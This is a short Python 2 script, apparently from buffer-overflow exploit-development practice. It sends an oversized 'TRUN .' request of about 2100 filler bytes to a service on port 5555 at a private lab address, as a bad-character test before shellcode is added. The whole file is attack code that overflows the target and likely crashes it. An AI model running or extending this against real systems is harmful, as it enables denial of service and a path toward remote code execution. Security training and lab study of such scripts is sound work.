#!/usr/bin/python2
import time, struct, sys
import socket as so


server = '172.16.52.128'
port = 5555

prefix = 'TRUN .'
a_len = 2100

# Bad chars: note that \x00 is likely always a bad char because of how strcpy stops copying data (so it's left out)
badchars = b''

#Stiching together the exploit
the_req = prefix + b'A' * (a_len - len(badchars) - 4) + badchars + b'BIRB'  # If "BIRB" exists, all badchars were loaded, and none cut off

# Setting up the configuration
s = so.socket(so.AF_INET, so.SOCK_STREAM)

s.connect((server, port))
print repr(s.recv(1024))
s.send(the_req)
print repr(s.recv(1024))

s.close()

